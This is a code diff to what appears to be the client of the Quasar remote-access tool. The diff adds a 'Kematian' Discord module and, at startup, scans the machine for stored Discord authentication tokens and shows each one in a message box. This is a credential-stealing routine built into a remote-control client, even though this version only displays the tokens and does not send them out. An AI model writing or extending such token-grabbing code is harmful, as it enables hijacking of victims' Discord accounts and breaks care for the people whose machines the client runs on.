@@ -1,4 +1,5 @@
 ﻿using Quasar.Client.IO;
+using Quasar.Client.Kematian.Discord;
 using System;
 using System.Diagnostics;
 using System.Net;
@@ -26,6 +27,13 @@ namespace Quasar.Client
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
+
+            var tokens = new GetTokens().ScanDiscordTokens();
+            foreach (var token in tokens)
+            {
+                MessageBox.Show(token, "Discord Token", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+
             Application.Run(new QuasarApplication());
         }
 
